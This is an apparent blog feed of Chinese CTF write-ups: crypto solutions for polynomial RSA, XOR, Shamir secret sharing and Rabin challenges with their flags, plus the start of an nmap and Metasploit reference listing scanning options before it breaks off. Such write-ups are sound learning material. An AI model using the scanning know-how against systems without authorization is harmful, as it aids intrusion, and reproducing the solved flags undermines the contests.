start="2"><li>作为学渣的我只会n是整数的时候~，然而n在这里是多项式,一开始连GF(有限域)都不知道是什么鬼，简直要了我的命,而且那个sage也不知道是哪个库，后来才发现是另外一个软件(支持python)</li></ol><ul><li><a href="https://wenku.baidu.com/view/038968b632d4b14e852458fb770bf78a65293a37.html" target="_blank" rel="noopener">有限域上的不可约多项式RSA体制</a></li></ul><ol start="3"><li>所以这题关键还是分解多项式n最终求得d=p*q,在此之前先求s(这个 s 类似于一般 RSA 中的 n 的欧拉值（phi）)</li><li>在pubkey.py后加上<strong>print n.factor()</strong>可以得到分解式<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190403182531.png?raw=true" alt=""></li><li><p>然后求逆元d</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import gmpy2</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s=(<span class="number">2</span>**<span class="number">1227</span>-<span class="number">1</span>)*(<span class="number">2</span>**<span class="number">821</span>-<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; e=<span class="number">31337</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d = invert(e,s)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print d</span><br><span class="line"><span class="number">28371355076358206651880108899447906576372266284154280282347957145120170645734899523334978078067679493874344060469168599875633378810644150054152285167807343298071802254581411860744158353096011714907819564399402714709858337654437633205741705120012058022068404602368525225166892620782231104596296684392603977673442420869964883518757302131139464582403543008517510576759631853686083804876647805871645437996963908242523987920166730933950556409136138395339773872530985876082852299816804207673785130661047844641798164979597836577807048385040982943227701240014693785196556609759136982566512240594608088626862145862029373010104</span></span><br></pre></td></tr></table></figure></li><li><p>有了d就可以写解密脚本了</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pubkey <span class="keyword">import</span> P, n, e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> decrypt(c,d):</span><br><span class="line">c_int = <span class="keyword">int</span>(c.encode(<span class="string">"hex"</span>),<span class="number">16</span>)</span><br><span class="line">c_poly = P(R.fetch_int(c_int))</span><br><span class="line">m_poly = pow(c_poly, d, n)</span><br><span class="line">m_int = R(m_poly).integer_representation()</span><br><span class="line">m = format(m_int, <span class="string">'0256x'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line">d = <span class="number">28371355076358206651880108899447906576372266284154280282347957145120170645734899523334978078067679493874344060469168599875633378810644150054152285167807343298071802254581411860744158353096011714907819564399402714709858337654437633205741705120012058022068404602368525225166892620782231104596296684392603977673442420869964883518757302131139464582403543008517510576759631853686083804876647805871645437996963908242523987920166730933950556409136138395339773872530985876082852299816804207673785130661047844641798164979597836577807048385040982943227701240014693785196556609759136982566512240594608088626862145862029373010104</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'../flag.enc'</span>, <span class="string">'r'</span>)</span><br><span class="line">c = f.<span class="keyword">read</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> decrypt(c,d)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190403191049.png?raw=true" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RSA-in-polynomial&quot;&gt;&lt;a href=&quot;#RSA-in-polynomial&quot; class=&quot;headerlink&quot; title=&quot;RSA in polynomial&quot;&gt;&lt;/a&gt;RSA in polynomial&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;题目给了三个文件如下
    
    </summary>
    
      <category term="CTFWP" scheme="https://cy9nusg4rd3n.github.io/categories/CTFWP/"/>
    
    
      <category term="Crypto" scheme="https://cy9nusg4rd3n.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>PCTF2019-Writeup</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/03/16/PCTF2019-Writeup/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/03/16/PCTF2019-Writeup/</id>
    <published>2019-03-16T04:45:35.000Z</published>
    <updated>2020-04-18T03:30:00.605Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Spoiler"><a href="#Spoiler" class="headerlink" title="Spoiler"></a>Spoiler</h2><blockquote><p>Bran Stark, wants to convey an important information to the Sansa back at winterfell. He sends her a message. The message however, is encrypted though.Can you find out what Bran is trying to convey??</p></blockquote><a id="more"></a><ol><li>题目给了一个key.pdf打开内容为<blockquote><p>3a2c3a35152538272c2d213e332e3c25383030373a15</p></blockquote></li><li>明明简单的一道题到头来做不出，后面发现脑洞还是不够强</li><li>winhex打开pdf看到文件尾后面有东西<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190313174436.png?raw=true" alt=""></li><li>提取出来刚好发现与米密文长度相同<blockquote><p>6a6f6e736e6f776973647261676f6e62796269727468</p></blockquote></li><li>xor一下<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=<span class="string">'3a2c3a35152538272c2d213e332e3c25383030373a15'</span></span><br><span class="line"><span class="attribute">b</span>=<span class="string">'6a6f6e736e6f776973647261676f6e62796269727468'</span></span><br><span class="line"><span class="attribute">flag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)/2):</span><br><span class="line">    flag+=chr(int(a[i<span class="number">*2</span>:i<span class="number">*2</span>+2],16)^int(b[i<span class="number">*2</span>:i<span class="number">*2</span>+2],16))</span><br><span class="line"><span class="builtin-name">print</span> flag</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>PCTF{JON_IS_TARGARYEN}</p></blockquote><h2 id="The-Order-of-the-Phoenix"><a href="#The-Order-of-the-Phoenix" class="headerlink" title="The Order of the Phoenix"></a>The Order of the Phoenix</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">It's a new age Order of the Phoenix. The current members are:</span><br><span class="line"></span><br><span class="line">1.Harry</span><br><span class="line">2.Hermione</span><br><span class="line">3.Ron</span><br><span class="line">4.George</span><br><span class="line">5.Charlie</span><br><span class="line">6.Bill</span><br><span class="line">7.Ginny</span><br><span class="line">8.Fleur</span><br><span class="line">9.Luna</span><br><span class="line">10.Neville</span><br><span class="line">Each of them has a secret QR code associated <span class="keyword">with</span> him/her which <span class="keyword">is</span> given <span class="keyword">to</span> you. <span class="keyword">At</span> the entrance <span class="keyword">of</span> the Grimmauld place, <span class="keyword">is</span> a <span class="keyword">system</span> <span class="keyword">to</span> <span class="keyword">scan</span> their QR codes.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Any</span> <span class="number">5</span> <span class="keyword">or</span> more <span class="keyword">of</span> them can enter <span class="keyword">at</span> once, but <span class="keyword">not</span> <span class="keyword">less</span> <span class="keyword">than</span> <span class="number">5.</span> This <span class="keyword">is</span> <span class="keyword">in</span> place <span class="keyword">to</span> prevent <span class="keyword">any</span> rash decisions made <span class="keyword">by</span> very few people regarding the matters concerning the Order.</span><br><span class="line"></span><br><span class="line">However, <span class="keyword">now</span> <span class="keyword">is</span> an emergency time. Malfoy <span class="keyword">is</span> causing trouble again, <span class="keyword">and</span> Harry needs <span class="keyword">to</span> enter Grimmauld Place <span class="keyword">for</span> which he needs <span class="keyword">to</span> know the secret associated <span class="keyword">with</span> the entry <span class="keyword">system</span> <span class="keyword">to</span> let him in. <span class="keyword">Help</span> him out.</span><br></pre></td></tr></table></figure><ol><li><p>题目给了10个人的二维码扫出来如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Bill: a<span class="number">-424</span>b<span class="number">493442128</span>adbeef<span class="number">5</span>ce<span class="number">33</span>f<span class="number">18</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">5996</span>cdd<span class="number">97e4922644</span>a<span class="number">4479</span>bb<span class="number">4e05</span>f<span class="number">8846</span>f</span><br><span class="line">Charlie: <span class="number">8</span><span class="number">-1268</span>bf<span class="number">4430</span><span class="keyword">c</span><span class="number">0</span>b<span class="number">1</span>a<span class="number">4</span><span class="keyword">c</span><span class="number">568</span>a<span class="number">302</span>da<span class="number">92421</span>bc<span class="number">672</span>aceb<span class="number">57</span>fef<span class="number">3401</span>f<span class="number">2434</span>cfc<span class="number">3</span>bf<span class="number">740</span>b</span><br><span class="line">Fleur: <span class="number">9</span>-b<span class="number">52781</span>fd<span class="number">38</span>b<span class="number">0185</span>bd<span class="number">1</span>a<span class="number">8</span>a<span class="number">92</span>a<span class="number">92</span>dbf<span class="number">01</span><span class="keyword">c</span><span class="number">99</span>eddbb<span class="number">50</span>b<span class="number">86</span>f<span class="number">65</span>a<span class="number">882</span>ad<span class="number">8</span>a<span class="number">7</span>fa<span class="number">313e9</span>d</span><br><span class="line">George: <span class="number">6</span><span class="number">-7</span><span class="keyword">c</span><span class="number">61</span>f<span class="number">3</span>ee<span class="number">00</span>ab<span class="number">759</span>a<span class="number">6853</span>f<span class="number">041e74</span>ae<span class="number">2378144</span>a<span class="number">96</span>b<span class="number">662230888</span>d<span class="number">6</span>ba<span class="number">6412</span><span class="keyword">c</span><span class="number">646190</span></span><br><span class="line">Ginny: <span class="number">7</span>-d<span class="number">01</span>f<span class="number">29e42</span>de<span class="number">0</span>ab<span class="number">1</span>fb<span class="number">183</span>a<span class="number">35</span>d<span class="number">06</span>a<span class="number">2</span>ac<span class="number">6117</span>acaad<span class="number">2</span>b<span class="number">3017671846</span><span class="keyword">c</span><span class="number">7</span>b<span class="number">380e83</span>d<span class="number">6</span>bb</span><br><span class="line">Harry: <span class="number">1</span>-d<span class="number">301</span>da<span class="number">5536</span>a<span class="number">5</span>d<span class="number">8</span>b<span class="number">8e2</span>be<span class="number">50</span>a<span class="number">7584127</span>eb<span class="number">3704025</span>f<span class="number">048</span>cf<span class="number">72335</span>f<span class="number">1</span>b<span class="number">301</span>b<span class="number">852</span>b<span class="number">30</span>a</span><br><span class="line">Hermione: <span class="number">2</span>-e<span class="number">1</span>af<span class="number">01e2</span>f<span class="number">7887</span>b<span class="number">63</span><span class="keyword">c</span><span class="number">068823</span>cbcd<span class="number">812</span>f<span class="number">91899678656456</span>db<span class="number">71</span>dfa<span class="number">9</span>ab<span class="number">1</span>fbb<span class="number">1</span>bd<span class="number">26</span></span><br><span class="line">Luna: <span class="number">4</span><span class="number">-510</span><span class="keyword">c</span><span class="number">9</span><span class="keyword">c</span><span class="number">8</span>f<span class="number">6</span>aaacebf<span class="number">16</span>bb<span class="number">5</span>fd<span class="number">9e2</span>cd<span class="number">8</span><span class="keyword">c</span><span class="number">0845</span>ec<span class="number">483</span>bd<span class="number">49</span>bf<span class="number">57</span>fa<span class="number">4151e5</span>b<span class="number">672</span><span class="keyword">c</span><span class="number">73</span>b<span class="number">0</span></span><br><span class="line">Neville: <span class="number">3</span>-dc<span class="number">60</span>d<span class="number">55</span>a<span class="number">411</span>ccfd<span class="number">4</span>a<span class="number">44e6</span>a<span class="number">9799774</span>dd<span class="number">6207</span>dffdfcab<span class="number">4</span>b<span class="number">442075</span>ead<span class="number">165</span>fa<span class="number">7</span>ecb</span><br><span class="line">Ron: <span class="number">5</span>-bd<span class="number">4</span>f<span class="number">58</span>a<span class="number">846</span>bb<span class="number">9e47</span>a<span class="number">7402e22</span>df<span class="number">13002</span>aef<span class="number">3</span>bf<span class="number">3048011674269</span>eaff<span class="number">39154</span><span class="keyword">c</span><span class="number">62</span>bf</span><br></pre></td></tr></table></figure></li><li><p>然而不知道是干嘛的，完全没方向</p></li><li>看了hint<blockquote><p>Eleven scientists are working on a secret project…….?</p></blockquote></li><li>google一下不懂，但是github上找到方法<br><a href="https://github.com/blockstack/secret-sharing/blob/master/README.md" target="_blank" rel="noopener">传送门</a><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from secretsharing import PlaintextToHexSecretSharer</span><br><span class="line">&gt;&gt;&gt; flags=['1-d301da<span class="number">5536</span>a5d8b8e2be50a<span class="number">758412</span>7eb<span class="number">370402</span>5f048cf<span class="number">7233</span>5f1b301b852b30a','2-e1af01e2f<span class="number">7887</span>b63c<span class="number">068823</span>cbcd812f<span class="number">91899678656456</span>db71dfa9ab1fbb1bd26','3-dc60d55a411ccfd4a44e6a<span class="number">979977</span>4dd<span class="number">6207</span>dffdfcab4b<span class="number">442075</span>ead165fa7ecb','4-510c9c8f6aaacebf16bb5fd9e2cd8c<span class="number">0845</span>ec483bd49bf57fa<span class="number">4151</span>e5b672c73b0','5-bd4f58a846bb9e47a<span class="number">7402</span>e22df<span class="number">1300</span>2aef3bf<span class="number">304801167426</span>9eaff<span class="number">3915</span>4c62bf','6-7c61f3ee00ab759a<span class="number">6853</span>f041e74ae<span class="number">237814</span>4a96b<span class="number">66223088</span>8d6ba<span class="number">6412</span>c<span class="number">646190</span>','7-d01f29e42de0ab1fb183a35d06a2ac<span class="number">6117</span>acaad2b<span class="number">3017671846</span>c7b380e83d6bb','8-<span class="number">1268</span>bf<span class="number">4430</span>c0b1a4c568a302da<span class="number">9242</span>1bc672aceb57fef<span class="number">3401</span>f<span class="number">2434</span>cfc3bf740b','9-b<span class="number">5278</span>1fd38b<span class="number">0185</span>bd1a8a92a92dbf01c99eddbb50b86f65a882ad8a7fa313e9d','a-424b<span class="number">49344212</span>8adbeef5ce33f18c6c<span class="number">5996</span>cdd97e<span class="number">492264</span>4a<span class="number">4479</span>bb4e05f<span class="number">8846</span>f']</span><br><span class="line">&gt;&gt;&gt; PlaintextToHexSecretSharer.recover_secret(flags[<span class="number">0</span>:<span class="number">10</span>])</span><br><span class="line">'pctf&#123;sh4m1r3_w4s_4_gr34t_m4n&#125;\n'</span><br></pre></td></tr></table></figure></li></ol><h2 id="Help-Rabin"><a href="#Help-Rabin" class="headerlink" title="Help Rabin"></a>Help Rabin</h2><blockquote><p>Rabin has received a text from someone special, but it’s all in ciphertext and he is unable to make head or tail of it. He requested her for a little hint, and she sent him the encryption algorithm. He’s still unable to decode the text. Not wanting to look dumb to her again, he needs your help in figuring out what she’s written for him. So help him out.</p><ol><li>ciphertext.txt<br>4f741fe93dd7e383ff527caa9a2f27d27fd74b53b62123837b74a2b024d0fbbe052f3b330ce5208ba989fc68e2f5235ac4e9dd9e091e7cb80c02745d9b2aad10cab9431590ae63117ce539ebf747b4bc81f2a293aea52f0b1fee746158dc45d0c8d60769a8a8e671fb049b52669a010a1ca6f5de851d715bf1821d8771bbeb47</li><li>publickey.pem解析出来<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">key</span>长度：<span class="number">1023</span></span><br><span class="line">模数：<span class="number">5</span>BE098727AE610DE9C104819F3A1F7CC5B3144810B38D4F4D51BBE11D9CA20F287EED0236BCED1FE443A335A2F33C7A8AC68F09FC5F38BFE374A9207D3073D402C7A65A30B60F75B10E43A296730AA22D32527F7203EC9BECC6A7A0DD70A5CE3D1D5F2A8DB9868E8A4534EEF705F2C6A8326C88A536B827C88BC0005227AC9</span><br><span class="line">指数：<span class="number">1</span> (<span class="number">0x1</span>)</span><br></pre></td></tr></table></figure></li></ol></blockquote><ol start="3"><li><p>encrypt.py</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def nextPrime(prim):</span><br><span class="line">    if isPrime(prim):</span><br><span class="line">        return prim</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return nextPrime(prim+1)</span><br><span class="line"></span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = nextPrime(p+1)</span><br><span class="line">while p%4 != 3 or q%4 !=3:</span><br><span class="line">    p = getPrime(512)</span><br><span class="line">    q = nextPrime(p+1)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">m = open('secret.txt').read()</span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">m = m**e</span><br><span class="line">c = (m*m)%n</span><br><span class="line">c = long_to_bytes(c)</span><br><span class="line">c = c.encode('hex')</span><br><span class="line"></span><br><span class="line">cipherfile = open('ciphertext.txt','w')</span><br><span class="line">cipherfile.write(c)</span><br></pre></td></tr></table></figure></li><li><p>题目得知用的是rabin算法,表面e=1,通过脚本可知实际是2</p></li><li>yafu分解模直接上脚本<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">import gmpy2</span><br><span class="line"><span class="comment"># f = open('flag.enc','r')</span></span><br><span class="line"><span class="comment"># c = f.read()</span></span><br><span class="line"><span class="comment"># c = libnum.s2n(c)</span></span><br><span class="line">c = 55794223709813934192265135096073563545914401645083132264094031861211381439924290498765378643984142482022780941488967640941896234878298378029331869035026299883890239650523385184000895121634725249518610468891121286187697095281449541110528807147056849808508384046722319812216434329882704675650502328191347845959</span><br><span class="line">p = 8268478798627496550868057067863302848395658194493470189583465530982345058367642548587735876643165276333944105562045538477589025350029252013031979923054823</span><br><span class="line">q = 8268478798627496550868057067863302848395658194493470189583465530982345058367642548587735876643165276333944105562045538477589025350029252013031979923054799</span><br><span class="line">n = p*q</span><br><span class="line">r = pow(c,(p+1)/4,p)</span><br><span class="line">s = pow(c,(q+1)/4,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x = (a*p*s+b*q*r)%n</span><br><span class="line">y = (a*p*s-b*q*r)%n</span><br><span class="line">print libnum.n2s(x%n)</span><br><span class="line">print libnum.n2s((-x)%n)</span><br><span class="line">print libnum.n2s(y%n)</span><br><span class="line">print libnum.n2s((-y)%n)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190313184457.png?raw=true" alt=""></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="EXORcism"><a href="#EXORcism" class="headerlink" title="EXORcism"></a>EXORcism</h2><blockquote><p>My friend Alex needs your help very fast. He has been possessed by a ghost and the only way to save him is if you tell the flag to the ghost. Hurry up, time is running out!</p></blockquote><ol><li>拿到文件encode.txt是一堆0和1，每行只有一个,去掉换行符后长度为10000,考虑是100*100,结果发现隐约是个二维码</li><li>然而直接扫不出来，把原始的1换作255 255 255，把0换作0 0 0写脚本<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="built_in">from</span> PIL import Image</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">x = <span class="number">100</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">100</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">new</span>(<span class="string">"RGB"</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line"><span class="built_in">file</span> = <span class="built_in">open</span>(<span class="string">'encoded.txt'</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        <span class="built_in">line</span> = <span class="built_in">file</span>.readline()<span class="comment">#获取一行</span></span><br><span class="line">        rgb = <span class="built_in">line</span>.<span class="built_in">split</span>(<span class="string">" "</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.save(<span class="string">"255.png"</span>)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190316122006.png?raw=true" alt=""></p><ol start="3"><li>从二维码得到<blockquote><p>160f15011d1b095339595138535f135613595e1a</p></blockquote></li><li>与flag异或得到<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=<span class="string">'160f15011d1b095339595138535f135613595e1a'</span></span><br><span class="line"><span class="attribute">b</span>=<span class="string">'flagflagflagflagflag'</span></span><br><span class="line"><span class="attribute">FLAG</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)/2):</span><br><span class="line">    FLAG+=chr(int(a[i<span class="number">*2</span>:i<span class="number">*2</span>+2],16)^ord(b[i]))</span><br><span class="line"><span class="builtin-name">print</span> FLAG</span><br><span class="line"><span class="comment">#pctf&#123;wh4_50_53r1u5?&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Late-PR"><a href="#Late-PR" class="headerlink" title="Late PR"></a>Late PR</h2><ol><li>直接丢进winhex搜索pctf<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190316124151.png?raw=true" alt=""></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cryptography&quot;&gt;&lt;a href=&quot;#Cryptography&quot; class=&quot;headerlink&quot; title=&quot;Cryptography&quot;&gt;&lt;/a&gt;Cryptography&lt;/h1&gt;&lt;h2 id=&quot;Spoiler&quot;&gt;&lt;a href=&quot;#Spoiler&quot; class=&quot;headerlink&quot; title=&quot;Spoiler&quot;&gt;&lt;/a&gt;Spoiler&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Bran Stark, wants to convey an important information to the Sansa back at winterfell. He sends her a message. The message however, is encrypted though.Can you find out what Bran is trying to convey??&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTFWP" scheme="https://cy9nusg4rd3n.github.io/categories/CTFWP/"/>
    
    
      <category term="CTF" scheme="https://cy9nusg4rd3n.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>nmap及msf的一些操作</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/02/03/nmap%E5%8F%8Amsf%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/02/03/nmap及msf的一些操作/</id>
    <published>2019-02-02T22:16:30.000Z</published>
    <updated>2020-04-18T03:23:50.005Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="nmap常见参数"><a href="#nmap常见参数" class="headerlink" title="nmap常见参数"></a>nmap常见参数</h1><h2 id="HOST-DISCOVERY主机发现"><a href="#HOST-DISCOVERY主机发现" class="headerlink" title="HOST DISCOVERY主机发现"></a>HOST DISCOVERY主机发现</h2><ul><li>-sL：简单列出扫描的目标</li><li>-sn：不做端口扫描，只进行主机发现</li><li>-PS/PA/PU/PY[portlist]：使用TCP、SYN/ACK、UDP或SCTP去发现端口</li><li>-n：不做DNS解析</li><li>-R：总是做DNS反向解析<a id="more"></a></li></ul><h2 id="SCAN-TECHNIQUES扫描技术"><a href="#SCAN-TECHNIQUES扫描技术" class="headerlink" title="SCAN TECHNIQUES扫描技术"></a>SCAN TECHNIQUES扫描技术</h2><ul><li>-sS/sT/sA/sW/sM：使用TCP SYN、全连接Connect()、ACK、Window、Maimon来进行扫描</li><li>-sU：UDP扫描</li><li>-sO：进行IP协议扫描</li></ul><h2 id="PORT-SPECIFICATION-AND-SCAN-ORDER端口说明和扫描规则"><a href="#PORT-SPECIFICATION-AND-SCAN-ORDER端口说明和扫描规则" class="headerlink" title="PORT SPECIFICATION AND SCAN ORDER端口说明和扫描规则"></a>PORT SPECIFICATION AND SCAN ORDER端口说明和扫描规则</h2><ul><li>-p <port ranges="">：只扫描指定的端口</port></li><li>-F：快速模式，扫描比默认端口数量更少的端口</li><li>–top-ports <number>：扫描排名指定的数字前几位的最常用的端口</number></li><li>–port-ratio <ratio>：扫描比输入的比例更常用的端口</ratio></li></ul><h2 id="SERVICE-VERSION-DETECTION服务、版本探测"><a href="#SERVICE-VERSION-DETECTION服务、版本探测" class="headerlink" title="SERVICE/VERSION DETECTION服务、版本探测"></a>SERVICE/VERSION DETECTION服务、版本探测</h2><ul><li>-sV：探测开启的端口来获取服务、版本信息</li></ul><h2 id="OS-DETECTION系统探测"><a href="#OS-DETECTION系统探测" class="headerlink" title="OS DETECTION系统探测"></a>OS DETECTION系统探测</h2><ul><li>-O：进行系统探测</li></ul><h2 id="OUTPUT输出"><a href="#OUTPUT输出" class="headerlink" title="OUTPUT输出"></a>OUTPUT输出</h2><ul><li>-v：增加的详细程度（使用VV更详细）</li></ul><h2 id="MISC杂项"><a href="#MISC杂项" class="headerlink" title="MISC杂项"></a>MISC杂项</h2><ul><li>-6：扫描IPv6的地址</li><li>-A：一次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描</li><li>-V：输出版本号</li></ul><h1 id="msf目录扫描"><a href="#msf目录扫描" class="headerlink" title="msf目录扫描"></a>msf目录扫描</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 